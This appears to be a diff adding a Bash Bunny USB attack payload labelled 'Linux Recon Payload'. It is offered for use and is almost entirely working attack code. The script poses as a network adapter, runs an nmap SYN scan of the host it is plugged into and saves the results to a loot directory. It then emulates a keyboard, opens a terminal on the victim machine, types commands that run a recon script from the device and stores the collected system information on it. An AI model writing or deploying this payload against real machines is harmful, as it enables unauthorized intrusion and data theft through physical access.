@@ -1,0 +1,63 @@
+#!/bin/bash
+#
+# Linux Recon Payload
+#
+# executes recon.sh to extract system info
+#
+
+# See nmap --help for options
+NMAP_OPTIONS="-F -sV -sS -T4"
+LOOTDIR=/root/udisk/loot/linuxnmap
+
+######## INITIALIZATION ########
+LED SETUP
+ATTACKMODE ECM_ETHERNET
+GET TARGET_IP
+GET TARGET_HOSTNAME
+GET SWITCH_POSITION
+
+######## MAKE LOOT DIRECTORY ########
+# Setup named logs in loot directory
+mkdir -p $LOOTDIR
+HOST=${TARGET_HOSTNAME}
+# If hostname is blank set it to "noname"
+[[ -z "$HOST" ]] && HOST="noname"
+COUNT=$(ls -lad $LOOTDIR/$HOST*.log | wc -l)
+COUNT=$((COUNT+1))
+
+######## ERROR IF NO TARGET IP ########
+if [ -z "${TARGET_IP}" ]; then
+    LED FAIL
+	exit 1
+fi
+
+######## ATTACK ########
+LED ATTACK
+nmap $NMAP_OPTIONS $TARGET_IP >> $LOOTDIR/$HOST-$COUNT.log
+
+########################################################## Info Grabbing part 
+#init
+LED SETUP
+ATTACKMODE HID STORAGE
+
+# attack
+LED ATTACK
+RUN UNITY gnome-terminal
+Q DELAY 1500
+Q STRING export lootdir=/run/media/\$USER/BashBunny/loot/linuxrecon #export loot folder  
+Q ENTER
+Q STRING export lootfile=\$lootdir/loot.txt #export lootfile 
+Q ENTER
+Q STRING mkdir -p \$lootdir #create loot directory 
+Q ENTER
+Q STRING export exepos=/run/media/\$USER/BashBunny/payloads/$SWITCH_POSITION #get location of shell script in the BB 
+Q ENTER
+Q STRING bash \$exepos/recon.sh \$lootfile #run recon shell file 
+Q ENTER
+Q DELAY 1500
+Q STRING exit
+Q ENTER 
+
+# finish
+
+LED FINISH
